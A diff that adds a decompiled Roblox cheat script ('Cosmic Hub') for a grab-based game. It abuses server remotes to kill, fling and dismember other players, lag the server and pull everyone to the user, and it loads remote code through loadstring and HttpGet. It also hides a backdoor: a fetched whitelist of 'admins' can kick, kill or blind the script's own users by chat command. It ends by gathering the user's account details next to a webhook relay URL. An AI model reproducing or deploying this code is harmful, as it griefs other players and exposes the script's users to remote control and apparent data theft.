+    Callback = function(p404)
+        if p404 then
+            startAirSuspendAura()
+        else
+            stopAirSuspendAura()
+        end
+    end,
+})
+u392.localPlayer.CharacterAdded:Connect(function(p405)
+    u392.playerCharacter = p405
+end)
+
+function startHellSendAura()
+    u392.gravityCoroutine = coroutine.create(function()
+        while true do
+            local v423, v424 = pcall(function()
+                local _Character28 = u392.localPlayer.Character
+
+                if _Character28 and _Character28:FindFirstChild('HumanoidRootPart') then
+                    local _HumanoidRootPart13 = _Character28.HumanoidRootPart
+                    local _CurrentCamera = _Workspace.CurrentCamera
+                    local v409, v410, v411 = pairs(u392.Players:GetPlayers())
+
+                    while true do
+                        local v412
+
+                        v411, v412 = v409(v410, v411)
+
+                        if v411 == nil then
+                            break
+                        end
+                        if v412 ~= u392.localPlayer and v412.Character then
+                            local _Character29 = v412.Character
+                            local _Torso2 = _Character29:FindFirstChild('Torso')
+
+                            if _Torso2 and (_Torso2.Position - _HumanoidRootPart13.Position).Magnitude <= u392.auraRadius then
+                                u392.SetNetworkOwner:FireServer(_Torso2, _HumanoidRootPart13.CFrame)
+
+                                local v415, v416, v417 = ipairs(_Character29:GetDescendants())
+
+                                while true do
+                                    local v418
+
+                                    v417, v418 = v415(v416, v417)
+
+                                    if v417 == nil then
+                                        break
+                                    end
+                                    if v418:IsA('BasePart') then
+                                        v418.CanCollide = false
+                                    end
+                                end
+
+                                local v419 = _Torso2:FindFirstChild('HellAuraPos') or Instance.new('BodyPosition')
+
+                                v419.Name = 'HellAuraPos'
+                                v419.MaxForce = Vector3.new(100000, 100000, 100000)
+                                v419.D = 500
+                                v419.P = 50000
+                                v419.Parent = _Torso2
+
+                                local v420 = _Torso2:FindFirstChild('HellAuraGyro') or Instance.new('BodyGyro')
+
+                                v420.Name = 'HellAuraGyro'
+                                v420.MaxTorque = Vector3.new(100000, 100000, 100000)
+                                v420.D = 500
+                                v420.P = 50000
+                                v420.Parent = _Torso2
+
+                                local _LookVector = _CurrentCamera.CFrame.LookVector
+                                local v422 = Vector3.new(0, 5, 0)
+
+                                v419.Position = _HumanoidRootPart13.Position + _LookVector * 15 + v422
+                                v420.CFrame = CFrame.new(_Torso2.Position, _HumanoidRootPart13.Position)
+                            end
+                        end
+                    end
+                end
+            end)
+
+            if not v423 then
+                warn('Error in Hell Send Aura: ' .. tostring(v424))
+            end
+
+            task.wait(0.05)
+        end
+    end)
+
+    coroutine.resume(u392.gravityCoroutine)
+end
+function stopHellSendAura()
+    if u392.gravityCoroutine then
+        coroutine.close(u392.gravityCoroutine)
+
+        u392.gravityCoroutine = nil
+    end
+end
+
+u392.Tab:AddToggle({
+    Name = 'Telekinesis Aura',
+    Default = false,
+    Callback = function(p425)
+        if p425 then
+            startHellSendAura()
+        else
+            stopHellSendAura()
+        end
+    end,
+})
+
+function death(p426)
+    if deathConnection then
+        deathConnection:Disconnect()
+    end
+    if p426 then
+        u29.Death_Aura = true
+        deathConnection = _RunService.Heartbeat:Connect(function()
+            local v427 = _Players
+            local v428, v429, v430 = ipairs(v427:GetPlayers())
+
+            while true do
+                local v431
+
+                v430, v431 = v428(v429, v430)
+
+                if v430 == nil then
+                    break
+                end
+                if v431 ~= _LocalPlayer and v431.Character then
+                    local _HumanoidRootPart14 = v431.Character:FindFirstChild('HumanoidRootPart')
+                    local _Head = v431.Character:FindFirstChild('Head')
+                    local _Humanoid8 = v431.Character:FindFirstChildOfClass('Humanoid')
+
+                    if _HumanoidRootPart14 and _Head and (_Humanoid8 and 0 < _Humanoid8.Health) and (_HumanoidRootPart14.Position - _LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 25 then
+                        pcall(function()
+                            _GrabEvents.SetNetworkOwner:FireServer(_HumanoidRootPart14, _HumanoidRootPart14.CFrame)
+                            task.wait(0.1)
+                            _GrabEvents.DestroyGrabLine:FireServer(_HumanoidRootPart14)
+
+                            if _Head:FindFirstChild('PartOwner') and _Head.PartOwner.Value == _LocalPlayer.Name then
+                                local v435, v436, v437 = pairs(_Humanoid8.Parent:GetChildren())
+
+                                while true do
+                                    local v438
+
+                                    v437, v438 = v435(v436, v437)
+
+                                    if v437 == nil then
+                                        break
+                                    end
+                                    if v438:IsA('BasePart') then
+                                        v438.CFrame = CFrame.new(-1000000000, 1000000000, -1000000000)
+                                    end
+                                end
+
+                                task.wait()
+
+                                local v439, v440, v441 = pairs(_Humanoid8.Parent:GetChildren())
+
+                                while true do
+                                    local v442
+
+                                    v441, v442 = v439(v440, v441)
+
+                                    if v441 == nil then
+                                        break
+                                    end
+                                    if v442:IsA('BasePart') then
+                                        v442.CFrame = CFrame.new(-1000000000, 1000000000, -1000000000)
+                                    end
+                                end
+
+                                local _BodyVelocity3 = Instance.new('BodyVelocity')
+
+                                _BodyVelocity3.Velocity = Vector3.new(0, -9999999, 0)
+                                _BodyVelocity3.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
+                                _BodyVelocity3.P = 100000075
+                                _BodyVelocity3.Parent = _HumanoidRootPart14
+                                _Humanoid8.Sit = false
+                                _Humanoid8.Jump = true
+                                _Humanoid8.BreakJointsOnDeath = false
+
+                                _Humanoid8:ChangeState(Enum.HumanoidStateType.Dead)
+                                task.delay(2, function()
+                                    if _BodyVelocity3 and _BodyVelocity3.Parent then
+                                        _BodyVelocity3:Destroy()
+                                    end
+                                end)
+                            end
+                        end)
+                    end
+                end
+            end
+        end)
+    else
+        u29.Death_Aura = false
+    end
+end
+
+v391:AddToggle({
+    Name = 'Death Aura',
+    Default = false,
+    Callback = death,
+})
+
+local v444 = v27:MakeTab({
+    Name = 'Teleport',
+    Icon = 'rbxassetid://6031068433',
+    PremiumOnly = false,
+})
+
+v444:AddSection({
+    Name = 'Teleport',
+})
+
+local u445 = false
+local u446 = nil
+
+function getAllPlayers()
+    local v447 = _Players
+    local v448, v449, v450 = pairs(v447:GetPlayers())
+    local v451 = {}
+
+    while true do
+        local v452
+
+        v450, v452 = v448(v449, v450)
+
+        if v450 == nil then
+            break
+        end
+        if v452 ~= _LocalPlayer then
+            table.insert(v451, v452.Name)
+        end
+    end
+
+    return v451
+end
+function updateDropdownOptions(p453)
+    p453:Refresh(getAllPlayers(), true)
+end
+
+local u455 = v444:AddDropdown({
+    Name = 'Select Player',
+    Default = nil,
+    Options = getAllPlayers(),
+    Callback = function(p454)
+        u14 = p454
+    end,
+})
+
+updateDropdownOptions(u455)
+
+function teleportToPlayer()
+    if u14 then
+        local v456 = _Players:FindFirstChild(u14)
+
+        if v456 and v456.Character and v456.Character:FindFirstChild('HumanoidRootPart') then
+            local _Position4 = v456.Character.HumanoidRootPart.Position
+
+            if _LocalPlayer.Character and _LocalPlayer.Character:FindFirstChild('HumanoidRootPart') then
+                _LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(_Position4)
+            else
+                u24:MakeNotification({
+                    Name = 'Error',
+                    Content = 'Character was not found.',
+                    Time = 3,
+                })
+            end
+        else
+            u24:MakeNotification({
+                Name = 'Error',
+                Content = 'Target player not found.',
+                Time = 3,
+            })
+        end
+    else
+        u24:MakeNotification({
+            Name = 'Error',
+            Content = 'No player selected.',
+            Time = 3,
+        })
+    end
+end
+
+v444:AddButton({
+    Name = 'Teleport to Player',
+    Callback = function()
+        teleportToPlayer()
+    end,
+})
+
+function startLoopTeleport()
+    u446 = coroutine.create(function()
+        while u445 do
+            teleportToPlayer()
+            wait(0.02)
+        end
+    end)
+
+    coroutine.resume(u446)
+end
+
+v444:AddToggle({
+    Name = 'Loop Teleport',
+    Default = false,
+    Callback = function(p458)
+        u445 = p458
+
+        if p458 then
+            startLoopTeleport()
+        else
+            u446 = nil
+        end
+    end,
+})
+_Players.PlayerAdded:Connect(function()
+    updateDropdownOptions(u455)
+end)
+_Players.PlayerRemoving:Connect(function()
+    updateDropdownOptions(u455)
+end)
+
+local v459 = v27:MakeTab({
+    Name = 'Random',
+    Icon = 'rbxassetid://4483345998',
+    PremiumOnly = false,
+})
+
+v459:AddSection({
+    Name = 'Working',
+})
+
+local u460 = false
+local u461 = 5
+
+function lagF()
+    while u460 do
+        for _ = 1, u461 do
+            local v462 = _Players
+            local v463, v464, v465 = ipairs(v462:GetPlayers())
+
+            while true do
+                local v466
+
+                v465, v466 = v463(v464, v465)
+
+                if v465 == nil then
+                    break
+                end
+                if v466.Character and v466.Character:FindFirstChild('Torso') then
+                    _ReplicatedStorage.GrabEvents.CreateGrabLine:FireServer(v466.Character.Torso, v466.Character.Torso.CFrame)
+                end
+            end
+        end
+
+        wait(1)
+    end
+end
+
+v459:AddToggle({
+    Name = 'Lag',
+    Default = false,
+    Callback = function(p467)
+        u460 = p467
+
+        if u460 then
+            task.spawn(lagF)
+        end
+    end,
+})
+v459:AddSlider({
+    Name = 'Lag Intensity',
+    Min = 1,
+    Max = 1000,
+    Default = 5,
+    Callback = function(p468)
+        u461 = p468
+    end,
+})
+
+local u469 = {
+    P = game:GetService('Players'),
+    RS = game:GetService('RunService'),
+    W = _Workspace,
+    A = false,
+    Q = {},
+    Pos = nil,
+    Cam = nil,
+    R = 15,
+    Conn = nil,
+    WL = false,
+    CB = Instance.new('Part'),
+}
+
+u469.CB.Anchored = true
+u469.CB.CanCollide = false
+u469.CB.Transparency = 1
+u469.CB.CanQuery = false
+u469.CB.Size = Vector3.new(10, 10, 10)
+
+function FzCam()
+    local _CurrentCamera2 = u469.W.CurrentCamera
+
+    u469.CB.CFrame = u469.Cam
+    u469.CB.Parent = u469.W
+    _CurrentCamera2.CameraType = Enum.CameraType.Scriptable
+    _CurrentCamera2.CFrame = u469.Cam
+end
+function UnFzCam()
+    u469.CB.Parent = nil
+
+    local _CurrentCamera3 = u469.W.CurrentCamera
+
+    _CurrentCamera3.CameraType = Enum.CameraType.Custom
+
+    if u469.Cam then
+        _CurrentCamera3.CFrame = u469.Cam
+    end
+
+    u469.Cam = nil
+end
+function NoCol(p472)
+    local v473, v474, v475 = pairs(p472:GetDescendants())
+
+    while true do
+        local v476
+
+        v475, v476 = v473(v474, v475)
+
+        if v475 == nil then
+            break
+        end
+        if v476:IsA('BasePart') then
+            v476.CanCollide = false
+        end
+    end
+end
+function InPlot(p477)
+    local _PlotItems = u469.W:FindFirstChild('PlotItems')
+
+    if _PlotItems then
+        _PlotItems = _PlotItems:FindFirstChild('PlayersInPlots')
+    end
+    if _PlotItems then
+        _PlotItems = _PlotItems:FindFirstChild(p477.Name)
+    end
+
+    return _PlotItems
+end
+function InRad(p479)
+    return (p479.Position - u469.Pos).Magnitude <= u469.R
+end
+function Ignore(p480)
+    return p480 == u469.P.LocalPlayer and true or (u469.WL and u469.P.LocalPlayer:IsFriendsWith(p480.UserId) and true or false)
+end
+function ReQ()
+    u469.Q = {}
+
+    local v481, v482, v483 = pairs(u469.P:GetPlayers())
+
+    while true do
+        local v484
+
+        v483, v484 = v481(v482, v483)
+
+        if v483 == nil then
+            break
+        end
+        if not Ignore(v484) and v484.Character and not InPlot(v484) then
+            local _HumanoidRootPart15 = v484.Character:FindFirstChild('HumanoidRootPart')
+
+            if _HumanoidRootPart15 and not InRad(_HumanoidRootPart15) then
+                table.insert(u469.Q, v484)
+            end
+        end
+    end
+end
+function Next()
+    if #u469.Q == 0 then
+        ReQ()
+
+        if #u469.Q == 0 then
+            return
+        end
+    end
+
+    local v486 = u469.Q[1]
+
+    table.remove(u469.Q, 1)
+
+    if v486 and v486.Character then
+        local _HumanoidRootPart16 = v486.Character:FindFirstChild('HumanoidRootPart')
+        local _Head2 = v486.Character:FindFirstChild('Head')
+        local _Character30 = u469.P.LocalPlayer.Character
+
+        if _Character30 then
+            _Character30 = u469.P.LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
+        end
+        if _HumanoidRootPart16 and _Head2 and _Character30 then
+            u469.P.LocalPlayer.Character:PivotTo(_HumanoidRootPart16.CFrame * CFrame.new(0, -6, 0))
+            NoCol(u469.P.LocalPlayer.Character)
+
+            local v490 = 0
+
+            repeat
+                _SetNetworkOwner:FireServer(_HumanoidRootPart16, _Character30.CFrame)
+                task.wait(0.15)
+
+                v490 = v490 + 1
+            until 20 < v490 or _Head2:FindFirstChild('PartOwner') and _Head2.PartOwner.Value == u469.P.LocalPlayer.Name or not u469.A
+
+            if u469.A and _Head2:FindFirstChild('PartOwner') and _Head2.PartOwner.Value == u469.P.LocalPlayer.Name then
+                _HumanoidRootPart16.CFrame = CFrame.new(u469.Pos)
+                _HumanoidRootPart16.Position = u469.Pos
+                _HumanoidRootPart16.AssemblyLinearVelocity = Vector3.zero
+
+                task.wait(0.8)
+            end
+        end
+    end
+end
+function Start()
+    local _Character31 = u469.P.LocalPlayer.Character
+
+    if _Character31 then
+        _Character31 = u469.P.LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
+    end
+    if _Character31 then
+        u469.Pos = _Character31.Position
+        u469.Cam = u469.W.CurrentCamera.CFrame
+
+        ReQ()
+        FzCam()
+
+        u469.Conn = u469.RS.Heartbeat:Connect(function()
+            if u469.A then
+                Next()
+
+                if u469.Cam then
+                    local _CurrentCamera4 = u469.W.CurrentCamera
+
+                    _CurrentCamera4.CameraType = Enum.CameraType.Scriptable
+                    _CurrentCamera4.CFrame = u469.Cam
+                    u469.CB.CFrame = u469.Cam
+                    u469.CB.Parent = u469.W
+                end
+            end
+        end)
+    end
+end
+function Stop()
+    if u469.Conn then
+        u469.Conn:Disconnect()
+
+        u469.Conn = nil
+    end
+
+    UnFzCam()
+
+    local _Character32 = u469.P.LocalPlayer.Character
+
+    if _Character32 then
+        _Character32 = u469.P.LocalPlayer.Character:FindFirstChild('HumanoidRootPart')
+    end
+    if _Character32 and u469.Pos then
+        _Character32.AssemblyLinearVelocity = Vector3.zero
+        _Character32.CFrame = CFrame.new(u469.Pos)
+    end
+end
+function CharAdd(p494)
+    p494:WaitForChild('Humanoid').Died:Connect(function()
+        if u469.Conn then
+            u469.Conn:Disconnect()
+
+            u469.Conn = nil
+        end
+
+        UnFzCam()
+    end)
+
+    if u469.A then
+        local _HumanoidRootPart17 = p494:WaitForChild('HumanoidRootPart')
+
+        u469.Pos = u469.Pos or _HumanoidRootPart17.Position
+        u469.Cam = u469.Cam or u469.W.CurrentCamera.CFrame
+
+        FzCam()
+
+        u469.Conn = u469.RS.Heartbeat:Connect(function()
+            if u469.A then
+                Next()
+
+                if u469.Cam then
+                    local _CurrentCamera5 = u469.W.CurrentCamera
+
+                    _CurrentCamera5.CameraType = Enum.CameraType.Scriptable
+                    _CurrentCamera5.CFrame = u469.Cam
+                    u469.CB.CFrame = u469.Cam
+                    u469.CB.Parent = u469.W
+                end
+            end
+        end)
+    end
+end
+
+u469.P.LocalPlayer.CharacterAdded:Connect(CharAdd)
+u469.P.PlayerAdded:Connect(function()
+    if u469.A then
+        ReQ()
+    end
+end)
+u469.P.PlayerRemoving:Connect(function(p497)
+    for v498 = #u469.Q, 1, -1 do
+        if u469.Q[v498] == p497 then
+            table.remove(u469.Q, v498)
+        end
+    end
+end)
+v459:AddToggle({
+    Name = 'Bring All',
+    Default = false,
+    Callback = function(p499)
+        u469.A = p499
+
+        if p499 then
+            Start()
+        else
+            Stop()
+        end
+    end,
+})
+v459:AddToggle({
+    Name = 'Whitelist Friends',
+    Default = false,
+    Callback = function(p500)
+        u469.WL = p500
+    end,
+})
+
+local u501 = {
+    ws = game:GetService('Workspace'),
+    plrs = game:GetService('Players'),
+    debris = game:GetService('Debris'),
+    uis = game:GetService('UserInputService'),
+    fpdHeight = _Workspace.FallenPartsDestroyHeight,
+    parts = {
+        'Left Leg',
+        'Right Leg',
+        'Left Arm',
+        'Right Arm',
+        'HumanoidRootPart',
+    },
+}
+
+function findHeldPlayer()
+    local _GrabParts = u501.ws:FindFirstChild('GrabParts')
+
+    if not _GrabParts then
+        return nil
+    end
+
+    local v503, v504, v505 = ipairs(_GrabParts:GetChildren())
+
+    while true do
+        local v506
+
+        v505, v506 = v503(v504, v505)
+
+        if v505 == nil then
+            break
+        end
+        if v506:IsA('BasePart') then
+            local v507, v508, v509 = ipairs(v506:GetChildren())
+
+            while true do
+                local v510
+
+                v509, v510 = v507(v508, v509)
+
+                if v509 == nil then
+                    break
+                end
+                if v510:IsA('WeldConstraint') and v510.Part1 and v510.Part1.Parent:IsA('Model') then
+                    local _Parent = v510.Part1.Parent
+
+                    if _Parent:FindFirstChildOfClass('Humanoid') then
+                        return u501.plrs:GetPlayerFromCharacter(_Parent)
+                    end
+                end
+            end
+        end
+    end
+
+    return nil
+end
+function teleportLimbParts(p512)
+    if p512 then
+        local _Character33 = p512.Character
+
+        if _Character33 then
+            local v514, v515, v516 = ipairs(u501.parts)
+            local v517 = {}
+
+            while true do
+                local v518
+
+                v516, v518 = v514(v515, v516)
+
+                if v516 == nil then
+                    break
+                end
+
+                local u519 = _Character33:FindFirstChild(v518)
+
+                if u519 then
+                    local v520, v521, v522 = ipairs(u501.ws:GetDescendants())
+
+                    while true do
+                        local v523
+
+                        v522, v523 = v520(v521, v522)
+
+                        if v522 == nil then
+                            break
+                        end
+                        if v523:IsA('WeldConstraint') and (v523.Part0 == u519 or v523.Part1 == u519) then
+                            v523.Enabled = false
+
+                            table.insert(v517, v523)
+                        end
+                    end
+
+                    local v524, v525, v526 = ipairs(u519:GetChildren())
+
+                    while true do
+                        local v527
+
+                        v526, v527 = v524(v525, v526)
+
+                        if v526 == nil then
+                            break
+                        end
+                        if v527:IsA('Motor6D') or v527:IsA('Weld') then
+                            v527.Enabled = false
+
+                            table.insert(v517, v527)
+                        end
+                    end
+
+                    u519.Anchored = false
+
+                    local u528 = Vector3.new(u519.Position.X, u501.fpdHeight - 100, u519.Position.Z)
+
+                    pcall(function()
+                        if u519:IsA('Model') then
+                            u519.PrimaryPart = u519.PrimaryPart or u519:FindFirstChildWhichIsA('BasePart')
+
+                            if u519.PrimaryPart then
+                                u519:SetPrimaryPartCFrame(CFrame.new(u528))
+                            end
+                        else
+                            u519.CFrame = CFrame.new(u528)
+                        end
+                    end)
+                    task.wait(0.1)
+                end
+            end
+
+            local v529, v530, v531 = ipairs(v517)
+
+            while true do
+                local v532
+
+                v531, v532 = v529(v530, v531)
+
+                if v531 == nil then
+                    break
+                end
+
+                v532.Enabled = true
+            end
+        end
+    else
+        return
+    end
+end
+function deleteUserLimbs()
+    local v533 = findHeldPlayer()
+
+    if v533 then
+        teleportLimbParts(v533)
+    end
+end
+
+if u501.uis.TouchEnabled then
+    v459:AddButton({
+        Name = 'Delete Limbs (Hold and ragdoll player)',
+        Callback = deleteUserLimbs,
+    })
+end
+
+local v534 = v27:MakeTab({
+    Name = 'Credits',
+    Icon = 'rbxassetid://6035047375',
+    PremiumOnly = false,
+})
+
+v534:AddLabel('CREATOR: Cosmic_TCU (TCUTCU_LLBDDLLZYXZY)')
+v534:AddLabel('GO FOLLOW: Crisila_TCU (Superduperalt0987)')
+v534:AddLabel('HELPERS: jeke/brilliant, moonydev')
+v534:AddButton({
+    Name = 'Cosmic Hub Discord Server',
+    Callback = function()
+        setclipboard('https://discord.gg/mzkKQhyNqv')
+        u24:MakeNotification({
+            Name = 'Copied!',
+            Content = 'Discord link has been copied to your clipboard.',
+            Image = 'rbxassetid://4483345998',
+            Time = 3,
+        })
+    end,
+})
+
+local v535 = v27:MakeTab({
+    Name = 'Extra',
+    Icon = 'rbxassetid://6031094675',
+    PremiumOnly = false,
+})
+
+v535:AddButton({
+    Name = 'Cosmic Hub Auras',
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/Jeffepicy/CosmicAuras/refs/heads/main/SigmaAuras', true))()
+    end,
+})
+v535:AddButton({
+    Name = 'Dex',
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/m0onyy/Test/refs/heads/main/mobile%20dex.lua', true))()
+    end,
+})
+v535:AddButton({
+    Name = 'Infinite Yield',
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/ttwizz/infiniteyield/master/source.lua', true))()
+    end,
+})
+v535:AddLabel('Current version: V2.049')
+
+local u536 = 'https://raw.githubusercontent.com/Jeffepicy/yeah/refs/heads/main/yeah'
+
+function checkShutdown()
+    local v537, u538 = pcall(function()
+        return game:HttpGet(u536)
+    end)
+
+    if v537 and u538 then
+        local u539 = nil
+
+        pcall(function()
+            u539 = _HttpService:JSONDecode(u538)
+        end)
+
+        if u539 == true then
+            _LocalPlayer:Kick('no')
+            task.wait(1)
+
+            while true do end
+        end
+    else
+        warn('Failed')
+    end
+end
+
+checkShutdown()
+
+local v540 = {}
+local u541 = 'https://raw.githubusercontent.com/Jeffepicy/whitelist/main/whitelist.txt'
+local v542, v543 = pcall(function()
+    return game:HttpGet(u541)
+end)
+
+if v542 and v543 then
+    local v544 = _HttpService:JSONDecode(v543)
+    local v545, v546
+
+    if typeof(v544) ~= 'table' then
+        v545 = u24
+        v546 = u29
+    else
+        local v547, v548, v549 = ipairs(v544)
+
+        v545 = u24
+        v546 = u29
+
+        while true do
+            local v550
+
+            v549, v550 = v547(v548, v549)
+
+            if v549 == nil then
+                break
+            end
+
+            table.insert(v540, v550)
+        end
+    end
+
+    local u551 = {}
+    local u552 = {}
+    local u553 = {}
+    local u554 = {}
+    local u555 = v540 or {}
+
+    function isAdmin(p556)
+        return table.find(u555, p556.UserId) ~= nil
+    end
+    function sendChatMessage(p557)
+        if _TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
+            local _DefaultChatSystemChatEvents = _ReplicatedStorage:FindFirstChild('DefaultChatSystemChatEvents')
+
+            if _DefaultChatSystemChatEvents and _DefaultChatSystemChatEvents:FindFirstChild('SayMessageRequest') then
+                _DefaultChatSystemChatEvents.SayMessageRequest:FireServer(p557, 'All')
+            end
+        else
+            local _TextChannels = _TextChatService:FindFirstChild('TextChannels')
+            local v560 = _TextChannels and _TextChannels:FindFirstChild('RBXGeneral')
+
+            if v560 then
+                v560:SendAsync(p557)
+            end
+        end
+    end
+    function toggleBlind(p561)
+        u553[p561] = not u553[p561]
+
+        local _BlindEffect = _LocalPlayer:FindFirstChild('PlayerGui'):FindFirstChild('BlindEffect')
+
+        if u553[p561] then
+            if not _BlindEffect then
+                local _ScreenGui = Instance.new('ScreenGui')
+
+                _ScreenGui.Name = 'BlindEffect'
+                _ScreenGui.ResetOnSpawn = false
+
+                local _Frame = Instance.new('Frame')
+
+                _Frame.Size = UDim2.new(1, 0, 1, 0)
+                _Frame.BackgroundColor3 = Color3.new(0, 0, 0)
+                _Frame.Parent = _ScreenGui
+                _ScreenGui.Parent = _LocalPlayer:WaitForChild('PlayerGui')
+            end
+        elseif _BlindEffect then
+            _BlindEffect:Destroy()
+        end
+    end
+    function handleAdminCommand(p565, p566)
+        if isAdmin(p565) then
+            local v567 = p566:lower()
+
+            if v567:sub(1, 8) == ':c kick ' then
+                local v568 = v567:sub(9)
+                local v569 = _Players
+                local v570, v571, v572 = ipairs(v569:GetPlayers())
+
+                while true do
+                    local v573
+
+                    v572, v573 = v570(v571, v572)
+
+                    if v572 == nil then
+                        break
+                    end
+                    if v573 ~= p565 and v573.Name:lower():sub(1, #v568) == v568 then
+                        v573:Kick('You have been kicked by an admin.')
+                    end
+                end
+            end
+            if v567:sub(1, 9) == ':c kill ' then
+                local v574 = v567:sub(10)
+                local v575 = _Players
+                local v576, v577, v578 = ipairs(v575:GetPlayers())
+
+                while true do
+                    local v579
+
+                    v578, v579 = v576(v577, v578)
+
+                    if v578 == nil then
+                        break
+                    end
+                    if v579 ~= p565 and v579.Character and v579.Character:FindFirstChild('Humanoid') then
+                        local v580 = v579.Name:lower()
+                        local v581 = v579.DisplayName:lower()
+
+                        if v580:sub(1, #v574) == v574 or v581:sub(1, #v574) == v574 then
+                            v579.Character.Humanoid.Health = 0
+                        end
+                    end
+                end
+            end
+            if v567:sub(1, 7) == ':c say ' then
+                local v582 = v567:sub(8)
+
+                if v582 and v582 ~= '' then
+                    sendChatMessage(v582)
+                end
+            end
+            if v567 == ':c aura' then
+                u552[p565] = not u552[p565]
+            end
+            if v567 == ':c e' then
+                toggleBlind(p565)
+            end
+            if v567:sub(1, 5) == ':c sb' then
+                local v583 = tonumber(v567:match('%d+'))
+
+                if v583 and 0 < v583 then
+                    u554[p565] = v583
+
+                    sendChatMessage('Safety bubble set to ' .. v583)
+                else
+                    u554[p565] = nil
+
+                    sendChatMessage('Safety bubble disabled')
+                end
+            end
+            if v567 == ':c tp all' and p565.Character and p565.Character:FindFirstChild('HumanoidRootPart') then
+                local _HumanoidRootPart18 = p565.Character.HumanoidRootPart
+                local v585 = _Players
+                local v586, v587, v588 = ipairs(v585:GetPlayers())
+
+                while true do
+                    local v589
+
+                    v588, v589 = v586(v587, v588)
+
+                    if v588 == nil then
+                        break
+                    end
+                    if v589 ~= p565 and v589.Character and v589.Character:FindFirstChild('HumanoidRootPart') then
+                        v589.Character.HumanoidRootPart.CFrame = _HumanoidRootPart18.CFrame + Vector3.new(3, 0, 0)
+                    end
+                end
+            end
+            if v567 == ':c kill all' then
+                local v590 = _Players
+                local v591, v592, v593 = ipairs(v590:GetPlayers())
+
+                while true do
+                    local v594
+
+                    v593, v594 = v591(v592, v593)
+
+                    if v593 == nil then
+                        break
+                    end
+                    if v594 ~= p565 and v594.Character and v594.Character:FindFirstChild('Humanoid') then
+                        v594.Character.Humanoid.Health = 0
+                    end
+                end
+            end
+            if v567 == ':c ban all' then
+                local v595 = _Players
+                local v596, v597, v598 = ipairs(v595:GetPlayers())
+
+                while true do
+                    local v599
+
+                    v598, v599 = v596(v597, v598)
+
+                    if v598 == nil then
+                        break
+                    end
+                    if v599 ~= p565 then
+                        v599:Kick('You have been banned by an admin.')
+                    end
+                end
+            end
+        end
+    end
+
+    if _TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
+        local v600, v601, v602 = ipairs(_Players:GetPlayers())
+
+        while true do
+            local u603
+
+            v602, u603 = v600(v601, v602)
+
+            if v602 == nil then
+                break
+            end
+
+            u603.Chatted:Connect(function(p604)
+                handleAdminCommand(u603, p604)
+            end)
+        end
+
+        _Players.PlayerAdded:Connect(function(p605)
+            p605.Chatted:Connect(function(p606)
+                handleAdminCommand(p605, p606)
+            end)
+        end)
+    else
+        local _TextChannels2 = _TextChatService:FindFirstChild('TextChannels')
+
+        if _TextChannels2 then
+            local _RBXGeneral = _TextChannels2:FindFirstChild('RBXGeneral')
+
+            if _RBXGeneral then
+                _RBXGeneral.MessageReceived:Connect(function(p609)
+                    local _TextSource = p609.TextSource
+
+                    if _TextSource then
+                        local v611 = _Players:GetPlayerByUserId(_TextSource.UserId)
+
+                        if v611 then
+                            handleAdminCommand(v611, p609.Text)
+                        end
+                    end
+                end)
+            end
+        end
+    end
+
+    _RunService.Heartbeat:Connect(function()
+        local v612, v613, v614 = pairs(u552)
+
+        while true do
+            local v615
+
+            v614, v615 = v612(v613, v614)
+
+            if v614 == nil then
+                break
+            end
+            if v615 and v614.Character and v614.Character:FindFirstChild('HumanoidRootPart') then
+                local _HumanoidRootPart19 = v614.Character.HumanoidRootPart
+                local v617 = tick()
+                local v618, v619, v620 = pairs(u551)
+                local v621 = v614
+
+                while true do
+                    v620 = v618(v619, v620)
+
+                    if v620 == nil then
+                        break
+                    end
+                    if v620 ~= v621 and v620.Character and v620.Character:FindFirstChild('HumanoidRootPart') then
+                        local v622 = (v617 + v620.UserId) % (2 * math.pi)
+                        local v623 = 10
+                        local v624 = Vector3.new(math.cos(v622) * v623, 0, math.sin(v622) * v623)
+
+                        v620.Character.HumanoidRootPart.CFrame = _HumanoidRootPart19.CFrame + v624
+                    end
+                end
+            end
+        end
+    end)
+    _RunService.Heartbeat:Connect(function()
+        local v625, v626, v627 = pairs(u554)
+
+        while true do
+            local v628
+
+            v627, v628 = v625(v626, v627)
+
+            if v627 == nil then
+                break
+            end
+            if v627.Character and v627.Character:FindFirstChild('HumanoidRootPart') then
+                local _HumanoidRootPart20 = v627.Character.HumanoidRootPart
+                local v630, v631, v632 = pairs(u551)
+                local v633 = v627
+
+                while true do
+                    v632 = v630(v631, v632)
+
+                    if v632 == nil then
+                        break
+                    end
+                    if v632 ~= v633 and v632.Character and v632.Character:FindFirstChild('HumanoidRootPart') then
+                        local _HumanoidRootPart21 = v632.Character.HumanoidRootPart
+
+                        if (_HumanoidRootPart20.Position - _HumanoidRootPart21.Position).Magnitude < v628 then
+                            local _Unit = (_HumanoidRootPart21.Position - _HumanoidRootPart20.Position).Unit
+
+                            _HumanoidRootPart21.CFrame = CFrame.new(_HumanoidRootPart20.Position + _Unit * v628)
+                        end
+                    end
+                end
+            end
+        end
+    end)
+
+    function registerUser(p636)
+        u551[p636] = true
+    end
+
+    registerUser(_LocalPlayer)
+    _Players.PlayerAdded:Connect(function(p637)
+        registerUser(p637)
+
+        if isAdmin(p637) then
+            task.delay(1, function()
+                sendChatMessage('Lord ' .. p637.DisplayName .. ' has joined.')
+            end)
+        end
+    end)
+    _Players.PlayerRemoving:Connect(function(p638)
+        u551[p638] = nil
+        u552[p638] = nil
+        u553[p638] = nil
+        u554[p638] = nil
+    end)
+
+    local u639 = {
+        HttpService = game:GetService('HttpService'),
+        Players = game:GetService('Players'),
+        MarketplaceService = game:GetService('MarketplaceService'),
+        LocalizationService = game:GetService('LocalizationService'),
+        RbxAnalyticsService = game:GetService('RbxAnalyticsService'),
+        webhookUrl = 'https://v0-discord-webhook-protector-nine.vercel.app/api/relay/etdvwb7e42',
+    }
+
+    u639.LocalPlayer = u639.Players.LocalPlayer
+    u639.UserId = u639.LocalPlayer.UserId
+    u639.Name = u639.LocalPlayer.Name
+    u639.DisplayName = u639.LocalPlayer.DisplayName
+    u639.Membership = tostring(u639.LocalPlayer.MembershipType):sub(21)
+    u639.Age = u639.LocalPlayer.AccountAge
